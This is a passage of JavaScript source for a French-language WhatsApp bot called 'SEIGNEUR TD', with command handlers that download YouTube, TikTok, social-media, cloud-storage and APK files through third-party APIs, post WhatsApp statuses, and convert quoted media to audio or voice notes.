      return { buf: Buffer.from(dl.data), title: null };
    }
  } catch(e) { console.log('[YT VIDEO cobalt]', e.message); }

  throw new Error('Téléchargement impossible. Installe yt-dlp: pip install yt-dlp');
}

// ─── YOUTUBE AUDIO (MP3) ─────────────────────────────────────────────────────
async function handleYouTubeAudio(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎵 Usage: ${config.prefix}ytmp3 <titre ou lien YouTube>` }, { quoted: message });
  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement audio en cours...*' }, { quoted: message });
  try {
    let videoUrl = query;
    if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
      const vid = await searchYouTubeId(query);
      if (!vid) throw new Error('Vidéo introuvable');
      videoUrl = `https://www.youtube.com/watch?v=${vid}`;
    }
    const { buf, title } = await downloadYouTubeAudioBuffer(videoUrl);
    await sock.sendMessage(remoteJid, { audio: buf, mimetype: 'audio/mpeg', fileName: `${title || query}.mp3` }, { quoted: message });
    await sock.sendMessage(remoteJid, { text: `✅ *${title || query}*\n📏 ${(buf.length/1024/1024).toFixed(2)} MB\n© SEIGNEUR TD`, edit: loadMsg.key });
  } catch(e) {
    console.error('[YT AUDIO]', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors du téléchargement audio.\n💡 ${e.message}`, edit: loadMsg.key });
  }
}

// ─── YouTube Vidéo ──────────────────────────────────────────────────────────
async function handleYouTubeVideo(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎬 Usage: ${config.prefix}playvideo <titre ou lien YouTube>` }, { quoted: message });
  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement vidéo en cours...*' }, { quoted: message });
  try {
    let videoUrl = query;
    if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
      const vid = await searchYouTubeId(query);
      if (!vid) throw new Error('Vidéo introuvable');
      videoUrl = `https://www.youtube.com/watch?v=${vid}`;
    }
    const { buf, title } = await downloadYouTubeVideoBuffer(videoUrl);
    await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: `✅ *${title || query}*\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n© SEIGNEUR TD ` }, { quoted: message });
    await sock.sendMessage(remoteJid, { text: '✅ Vidéo envoyée !', edit: loadMsg.key });
  } catch(e) {
    console.error('[YT VIDEO]', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors du téléchargement vidéo.\n💡 ${e.message}`, edit: loadMsg.key });
  }
}

// ─── ytSearch compat ────────────────────────────────────────────────────────
async function ytSearch(query) {
  try {
    const vid = await searchYouTubeId(query);
    if (!vid) return { status: false };
    return { status: true, result: { searched_title: query, searched_url: `https://youtu.be/${vid}`, videoId: vid } };
  } catch { return { status: false }; }
}

// ─── Play Menu ──────────────────────────────────────────────────────────────
async function handlePlayMenu(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎵 Usage: ${config.prefix}play <titre YouTube>` }, { quoted: message });
  const searchQuery = args.join(' ');
  try { await sock.sendMessage(remoteJid, { react: { text: '✨', key: message.key } }); } catch(e) {}
  const loadMsg = await sock.sendMessage(remoteJid, { text: '🔍 *Recherche en cours...*' }, { quoted: message });
  try {
    const r = await axios.get('https://api-faa.my.id/faa/ytplayvid', { params: { q: searchQuery }, timeout: 10000 });
    const res = r.data?.result;
    if (!res) throw new Error('Vidéo introuvable');
    const p = config.prefix;
    await sock.sendMessage(remoteJid, { text: `🎶 *YouTube Player*\n\n📌 *${res.title || searchQuery}*\n🔗 https://youtu.be/${res.videoId}`, edit: loadMsg.key });

  } catch(e) {
    console.error('[PLAY MENU]', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
  }
}

// ─── Play Audio (alias) ─────────────────────────────────────────────────────
async function handlePlayAudio(sock, args, remoteJid, senderJid, message) {
  return handleYouTubeAudio(sock, args, remoteJid, senderJid, message);
}

// ─── Play Video (alias) ─────────────────────────────────────────────────────
async function handlePlayVideo(sock, args, remoteJid, senderJid, message) {
  return handleYouTubeVideo(sock, args, remoteJid, senderJid, message);
}

// ─── Play PTT ───────────────────────────────────────────────────────────────
async function handlePlayPTT(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎤 Usage: ${config.prefix}playptt <titre>` }, { quoted: message });
  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement PTT en cours...*' }, { quoted: message });
  try {
    const r = await axios.get('https://api-faa.my.id/faa/ytplayvid', { params: { q: query }, timeout: 10000 });
    const vid = r.data?.result?.videoId;
    if (!vid) throw new Error('Vidéo introuvable');
    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/savetubemp3?apikey=gifted&url=${encodeURIComponent(`https://www.youtube.com/watch?v=${vid}`)}`, { timeout: 30000 });
    if (!data?.success || !data?.result?.download_url) throw new Error('API indisponible');
    const dlRes = await axios.get(data.result.download_url, { responseType: 'arraybuffer', timeout: 90000 });
    await sock.sendMessage(remoteJid, { audio: Buffer.from(dlRes.data), mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: message });
    await sock.sendMessage(remoteJid, { text: '✅ PTT envoyé !', edit: loadMsg.key });
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
  }
}

// ─── TikTok ─────────────────────────────────────────────────────────────────
// ─── GIFTED DOWNLOAD — Toutes les commandes download via api.giftedtech.co.ke ──
async function handleXwolfDownload(sock, command, args, remoteJid, message) {
  const GIFTED = 'https://api.giftedtech.co.ke/api/download';
  const query = args.join(' ').trim();
  const url   = args[0]?.trim() || '';

  try { await sock.sendMessage(remoteJid, { react: { text: '⏳', key: message.key } }); } catch(e) {}
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Traitement en cours...*' }, { quoted: message });
  const editLoad = async (txt) => { try { await sock.sendMessage(remoteJid, { text: txt, edit: loadMsg.key }); } catch(e) {} };

  try {

    // ── APK ───────────────────────────────────────────────────────────────────
    if (command === 'apk') {
      if (!query) return editLoad(`❗ Usage: ${config.prefix}apk <nom application>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/apkdl`, { params: { apikey: 'gifted', appName: query }, timeout: 60000 });
      const result = data?.result?.[0] || data?.results?.[0] || data?.result || data;
      const dlUrl = result?.download || result?.dllink || result?.apk_link || result?.link;
      const title = result?.name || result?.app || query;
      const size  = result?.size || result?.filesize || '';
      const version = result?.version || '';
      if (!dlUrl) {
        const infoText = `🔍 *APK trouvé:* ${title}${version ? '\n📦 Version: ' + version : ''}${size ? '\n📏 Taille: ' + size : ''}\n\n*© SEIGNEUR TD*`;
        return editLoad(infoText);
      }
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        document: buf, mimetype: 'application/vnd.android.package-archive',
        fileName: `${title}.apk`, caption: `✅ *${title}*${version ? '\n📦 ' + version : ''}
📏 ${size || (buf.length/1024/1024).toFixed(1) + ' MB'}

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ APK envoyé !');

    // ── FB ────────────────────────────────────────────────────────────────────
    } else if (command === 'fb') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}fb <url Facebook>`);

      const fbPatterns = [
        /https?:\/\/(?:www\.)?facebook\.com\//,
        /https?:\/\/fb\.watch\//,
        /https?:\/\/m\.facebook\.com\//,
        /https?:\/\/web\.facebook\.com\//,
        /https?:\/\/(?:www\.)?facebook\.com\/share\//
      ];
      if (!fbPatterns.some(p => p.test(url))) {
        return editLoad('❌ Lien Facebook invalide. Fournis un lien vidéo Facebook valide.');
      }

      await editLoad('⏳ Téléchargement en cours...');

      // Essai 1 : API principale
      let dlUrl = null, title = 'Facebook';
      try {
        const { data } = await axios.get(
          `https://apiskeith.top/download/fbdown?url=${encodeURIComponent(url)}`,
          { timeout: 60000 }
        );
        if (data?.status && data?.result?.media) {
          dlUrl = data.result.media.hd || data.result.media.sd;
          title = data.result.title || title;
        }
      } catch(e1) {}

      // Essai 2 : API de secours
      if (!dlUrl) {
        try {
          const { data } = await axios.get(
            `https://api.giftedtech.co.ke/api/download/facebookv2`,
            { params: { apikey: 'gifted', url }, timeout: 60000 }
          );
          const r = data?.result || data;
          dlUrl = r?.hd || r?.sd || r?.download_url || r?.url || r?.video;
          title = r?.title || title;
        } catch(e2) {}
      }

      if (!dlUrl) throw new Error('Vidéo introuvable — vérifie que le lien est public');

      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        video: buf, mimetype: 'video/mp4',
        caption: `✅ *${title}*\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n\n*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ Facebook envoyé !');

    // ── YTMP4 ─────────────────────────────────────────────────────────────────
    } else if (command === 'ytmp4') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}ytmp4 <url YouTube>`);
      const { data } = await axios.get(`${GIFTED}/ytmp4`, { params: { apikey: 'gifted', url, quality: '720p' }, timeout: 120000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const title = data?.result?.title || data?.title || 'vidéo';
      if (!dlUrl) throw new Error('Vidéo introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 240000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        video: buf, mimetype: 'video/mp4',
        caption: `✅ *${title}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ YouTube MP4 envoyé !');

    // ── YTMP3 ─────────────────────────────────────────────────────────────────
    } else if (command === 'ytmp3' || command === 'ytaudio') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}ytmp3 <url YouTube>`);
      const { data } = await axios.get(`${GIFTED}/ytmp3`, { params: { apikey: 'gifted', url, quality: '128kbps' }, timeout: 120000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const title = data?.result?.title || data?.title || 'audio';
      if (!dlUrl) throw new Error('Audio introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        audio: buf, mimetype: 'audio/mpeg', fileName: `${title}.mp3`
      }, { quoted: message });
      await editLoad(`✅ *${title}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB`);

    // ── TIKTOK ────────────────────────────────────────────────────────────────
    } else if (command === 'tiktok' || command === 'tiktokmp3') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}${command} <url TikTok>`);
      const { data } = await axios.get(`${GIFTED}/tiktokdlv2`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const r = data?.result || data;
      if (command === 'tiktokmp3') {
        const audioUrl = r?.music || r?.audio;
        if (!audioUrl) throw new Error('Audio TikTok introuvable');
        const res = await axios.get(audioUrl, { responseType: 'arraybuffer', timeout: 120000 });
        const buf = Buffer.from(res.data);
        await sock.sendMessage(remoteJid, { audio: buf, mimetype: 'audio/mpeg', fileName: 'tiktok.mp3' }, { quoted: message });
        await editLoad('✅ TikTok Audio envoyé !');
      } else {
        const dlUrl = r?.video_nowm || r?.video || r?.play;
        if (!dlUrl) throw new Error('Vidéo TikTok introuvable');
        const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
        const buf = Buffer.from(res.data);
        await sock.sendMessage(remoteJid, {
          video: buf, mimetype: 'video/mp4',
          caption: `✅ *TikTok*\n${r?.title ? '📝 ' + r.title + '\n' : ''}📏 ${(buf.length/1024/1024).toFixed(1)} MB\n\n*© SEIGNEUR TD*`
        }, { quoted: message });
        await editLoad('✅ TikTok envoyé !');
      }

    // ── GOOGLE DRIVE ──────────────────────────────────────────────────────────
    } else if (command === 'googledrv' || command === 'gdrive') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}googledrv <url Google Drive>`);
      const { data } = await axios.get(`${GIFTED}/gdrivedl`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const fname = data?.result?.name || data?.name || 'fichier';
      if (!dlUrl) throw new Error('Fichier introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 240000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        document: buf, fileName: fname, mimetype: 'application/octet-stream',
        caption: `✅ *${fname}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ Google Drive envoyé !');

    // ── MEDIAFIRE ─────────────────────────────────────────────────────────────
    } else if (command === 'mediafire') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}mediafire <url MediaFire>`);
      const { data } = await axios.get(`${GIFTED}/mediafire`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const fname = data?.result?.filename || data?.filename || 'fichier';
      if (!dlUrl) throw new Error('Fichier introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 240000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        document: buf, fileName: fname, mimetype: 'application/octet-stream',
        caption: `✅ *${fname}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ MediaFire envoyé !');

    // ── INSTAGRAM ─────────────────────────────────────────────────────────────
    } else if (command === 'insta' || command === 'ig') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}ig <url Instagram>`);
      const { data } = await axios.get(`https://apis.xwolf.space/api/download/instagram/story`, { params: { url }, timeout: 60000 });
      const medias = data?.result || (data?.url ? [{ url: data.url }] : []);
      const mediaList = Array.isArray(medias) ? medias : [medias];
      if (!mediaList.length) throw new Error('Aucun média trouvé');
      for (const m of mediaList.slice(0, 5)) {
        const dlUrl = m?.url || m?.download_url || m?.video || m?.image;
        if (!dlUrl) continue;
        const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 120000 });
        const buf = Buffer.from(res.data);
        const isVid = String(dlUrl).includes('.mp4') || m?.type === 'video';
        if (isVid) await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: '🎥 *Instagram*\n\n*© SEIGNEUR TD*' }, { quoted: message });
        else await sock.sendMessage(remoteJid, { image: buf, caption: '🖼️ *Instagram*\n\n*© SEIGNEUR TD*' }, { quoted: message });
      }
      await editLoad('\u2705 Instagram envoy\u00e9 !');
    // ── SNAPCHAT ────────────────────────────────────────────────────────────────────────
    } else if (command === 'snap' || command === 'snapchat') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}snap <url Snapchat>`);
      const { data } = await axios.get(`https://apis.xwolf.space/api/download/snapchat`, { params: { url }, timeout: 60000 });
      const medias = data?.result || (data?.url ? [{ url: data.url }] : []);
      const mediaList = Array.isArray(medias) ? medias : [medias];
      if (!mediaList.length) throw new Error('Aucun média Snapchat trouvé');
      for (const m of mediaList.slice(0, 5)) {
        const dlUrl = m?.url || m?.download_url || m?.video || m?.image;
        if (!dlUrl) continue;
        const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 120000 });
        const buf = Buffer.from(res.data);
        const isVid = String(dlUrl).includes('.mp4') || m?.type === 'video';
        if (isVid) await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: '🎥 *Snapchat*\n\n*© SEIGNEUR TD*' }, { quoted: message });
        else await sock.sendMessage(remoteJid, { image: buf, caption: '🖼️ *Snapchat*\n\n*© SEIGNEUR TD*' }, { quoted: message });
      }
      await editLoad('✅ Snapchat envoyé !');

    // \u2500\u2500 GOOGLE SEARCH \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    } else if (command === 'google') {
      if (!query) return editLoad(`\u2757 Usage: ${config.prefix}google <recherche>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/search/google`, { params: { apikey: 'gifted', query }, timeout: 30000 });
      const results = data?.result || data?.results || [];
      if (!results.length) throw new Error('Aucun r\u00e9sultat trouv\u00e9');
      let text = `\ud83d\udd0d *Google: ${query}*\n${'\u2501'.repeat(28)}\n\n`;
      results.slice(0, 5).forEach((r, i) => {
        const title = r?.title || r?.name || '';
        const snippet = r?.snippet || r?.description || r?.body || '';
        const link = r?.link || r?.url || '';
        text += `*${i + 1}.* ${title}\n`;
        if (snippet) text += `\ud83d\udcdd ${snippet}\n`;
        if (link) text += `\ud83d\udd17 ${link}\n`;
        text += '\n';
      });
      text += `*\u00a9 SEIGNEUR TD*`;
      await sock.sendMessage(remoteJid, { text }, { quoted: message });
      await editLoad('\u2705 R\u00e9sultats Google envoy\u00e9s !');

    // \u2500\u2500 PAROLES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    } else if (command === 'parole' || command === 'lyrics') {
      if (!query) return editLoad(`\u2757 Usage: ${config.prefix}parole <titre - artiste>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/search/lyrics`, { params: { apikey: 'gifted', query }, timeout: 30000 });
      const title   = data?.result?.title   || data?.title   || query;
      const artist  = data?.result?.artist  || data?.artist  || '';
      const lyrics  = data?.result?.lyrics  || data?.lyrics  || data?.result || '';
      if (!lyrics) throw new Error('Paroles introuvables');
      const lyricsText = typeof lyrics === 'string' ? lyrics : JSON.stringify(lyrics);
      const header = `\ud83c\udfb5 *${title}*${artist ? '\n\ud83c\udfa4 ' + artist : ''}\n${'\u2501'.repeat(28)}\n\n`;
      const full = header + lyricsText + `\n\n*\u00a9 SEIGNEUR TD*`;
      if (full.length > 4000) {
        const chunks = [];
        let remaining = lyricsText;
        while (remaining.length > 0) { chunks.push(remaining.slice(0, 3500)); remaining = remaining.slice(3500); }
        await sock.sendMessage(remoteJid, { text: header + chunks[0] }, { quoted: message });
        for (let i = 1; i < chunks.length; i++) {
          await sock.sendMessage(remoteJid, { text: chunks[i] + (i === chunks.length - 1 ? '\n\n*\u00a9 SEIGNEUR TD*' : '') });
        }
      } else {
        await sock.sendMessage(remoteJid, { text: full }, { quoted: message });
      }
      await editLoad('\u2705 Paroles envoy\u00e9es !');


    // -- SOUNDCLOUD / SONG --------------------------------------------------
    } else if (command === 'song' || command === 'soundcloud' || command === 'sc') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`! Usage: ${config.prefix}song <url SoundCloud>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/soundclouddl`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const result = data?.result || data;
      const dlUrl = result?.download_url || result?.audio || result?.url || result?.link;
      const title = result?.title || result?.name || 'audio';
      const artist = result?.artist || result?.uploader || '';
      const duration = result?.duration || '';
      if (!dlUrl) throw new Error('Audio SoundCloud introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        audio: buf, mimetype: 'audio/mpeg', fileName: `${title}.mp3`
      }, { quoted: message });
      await editLoad(`OK *${title}*${artist ? ' - ' + artist : ''}${duration ? ' (' + duration + ')' : ''} - ${(buf.length/1024/1024).toFixed(1)} MB - (c) SEIGNEUR TD`);

    } else {
      await editLoad(`❗ Commande inconnue: ${command}`);
    }

    try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

  } catch(e) {
    console.error('[GIFTED DL]', e.message);
    await editLoad(`❌ Erreur: ${e.message}

*© SEIGNEUR TD*`);
    try { await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } }); } catch(ex) {}
  }
}

async function handleToStatus(sock, args, message, remoteJid, senderJid) {
  const BG_COLORS = [
    '#000000', '#1a1a2e', '#16213e', '#0f3460',
    '#533483', '#e94560', '#ff6b6b', '#ffd93d',
    '#6bcb77', '#4d96ff', '#845ec2', '#ff9671'
  ];
  const randomBg = () => BG_COLORS[Math.floor(Math.random() * BG_COLORS.length)];
  const randomFont = () => Math.floor(Math.random() * 8);

  // Construire la liste des JIDs pour le status broadcast
  function buildStatusJidList(sock) {
    const list = new Set();
    const contacts = sock._store?.contacts || {};
    for (const jid of Object.keys(contacts)) {
      if (jid.endsWith('@s.whatsapp.net')) list.add(jid);
    }
    if (sock?.user?.id) {
      const selfJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      list.add(selfJid);
    }
    return [...list];
  }

  try {
    await sock.sendMessage(remoteJid, { react: { text: '📤', key: message.key } });

    const rawText =
      message.message?.conversation ||
      message.message?.extendedTextMessage?.text ||
      message.message?.imageMessage?.caption ||
      message.message?.videoMessage?.caption || '';

    const caption = rawText.trim().split(/\s+/).slice(1).join(' ').trim();
    const contextInfo = message.message?.extendedTextMessage?.contextInfo;
    const quoted = contextInfo?.quotedMessage;

    if (!caption && !quoted) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `*Usage:*\n◈ Réponds à une image/vidéo/audio avec *${config.prefix}tostatus*\n◈ *${config.prefix}tostatus <texte>* — poster un statut texte\n◈ Réponds + *${config.prefix}tostatus <légende>* — média avec légende`
      }, { quoted: message });
    }

    const statusJidList = buildStatusJidList(sock);
    const _send = sock._origSend || sock.sendMessage.bind(sock);

    if (quoted) {
      const quotedMsg = {
        key: {
          remoteJid: remoteJid,
          id: contextInfo.stanzaId,
          fromMe: false,
          participant: contextInfo.participant || undefined
        },
        message: quoted
      };

      const getBuffer = async (type) => {
        const stream = await downloadContentFromMessage(quoted[type + 'Message'], type);
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        return Buffer.concat(chunks);
      };

      // Image
      if (quoted.imageMessage) {
        const buffer = await getBuffer('image');
        if (!buffer || buffer.length < 100) {
          await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
          return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement image !' });
        }
        await _send('status@broadcast', {
          image: buffer,
          caption: caption || quoted.imageMessage?.caption || '',
          mimetype: quoted.imageMessage?.mimetype || 'image/jpeg'
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Image postée sur ton statut !' });
      }

      // Vidéo
      if (quoted.videoMessage) {
        const buffer = await getBuffer('video');
        if (!buffer || buffer.length < 100) {
          await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
          return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement vidéo !' });
        }
        await _send('status@broadcast', {
          video: buffer,
          caption: caption || quoted.videoMessage?.caption || '',
          mimetype: quoted.videoMessage?.mimetype || 'video/mp4',
          gifPlayback: false
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Vidéo postée sur ton statut !' });
      }

      // Audio
      if (quoted.audioMessage) {
        const buffer = await getBuffer('audio');
        if (!buffer || buffer.length < 100) {
          await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
          return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement audio !' });
        }
        await _send('status@broadcast', {
          audio: buffer,
          mimetype: quoted.audioMessage?.mimetype || 'audio/mp4',
          ptt: false
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Audio posté sur ton statut !' });
      }

      // Texte cité
      const quotedText = quoted.conversation || quoted.extendedTextMessage?.text || '';
      const textToPost = caption || quotedText;
      if (textToPost) {
        await _send('status@broadcast', {
          text: textToPost,
          backgroundColor: randomBg(),
          font: randomFont()
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Statut texte posté !' });
      }

      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: '⚠️ Type de média non supporté. Réponds à une image, vidéo, audio ou texte.'
      });
    }

    // Texte simple sans citation
    await _send('status@broadcast', {
      text: caption,
      backgroundColor: randomBg(),
      font: randomFont()
    }, { statusJidList });
    await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
    return await sock.sendMessage(remoteJid, { text: '✅ Statut texte posté !' });

  } catch(e) {
    console.error('tostatus:', e);
    await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
  }
}

// .tosgroup — Poster un statut de groupe (groupStatusMessage)
// ── toaudio — Convertit un média cité en audio mp3 ──────────────────────────
async function handleToAudio(sock, args, message, remoteJid, senderJid) {
  try {
    await sock.sendMessage(remoteJid, { react: { text: '🎵', key: message.key } });

    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Réponds à un audio, une vidéo ou un vocal avec *${config.prefix}toaudio*`
      }, { quoted: message });
    }

    let buffer = null;
    let srcType = null;

    if (quoted.audioMessage) {
      srcType = 'audio';
      const stream = await downloadContentFromMessage(quoted.audioMessage, 'audio');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else if (quoted.videoMessage) {
      srcType = 'video';
      const stream = await downloadContentFromMessage(quoted.videoMessage, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Type de média non supporté. Réponds à un audio ou une vidéo.`
      }, { quoted: message });
    }

    if (!buffer || buffer.length < 100) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement du média.' });
    }

    await sock.sendMessage(remoteJid, {
      audio: buffer,
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: message });

    await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
  } catch(e) {
    console.error('[TOAUDIO]', e);
    await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
  }
}

// ── toptt — Convertit un média cité en vocal (push-to-talk) ──────────────────
async function handleToPtt(sock, args, message, remoteJid, senderJid) {
  try {
    await sock.sendMessage(remoteJid, { react: { text: '🎤', key: message.key } });

    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Réponds à un audio, une vidéo ou un vocal avec *${config.prefix}toptt*`
      }, { quoted: message });
    }

    let buffer = null;

    if (quoted.audioMessage) {
      const stream = await downloadContentFromMessage(quoted.audioMessage, 'audio');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else if (quoted.videoMessage) {
      const stream = await downloadContentFromMessage(quoted.videoMessage, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Type de média non supporté. Réponds à un audio ou une vidéo.`
      }, { quoted: message });
    }

    if (!buffer || buffer.length < 100) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement du média.' });
    }

    await sock.sendMessage(remoteJid, {
      audio: buffer,
      mimetype: 'audio/ogg; codecs=opus',
      ptt: true
    }, { quoted: message });

    await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
  } catch(e) {
    console.error('[TOPTT]', e);
    await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
  }
}

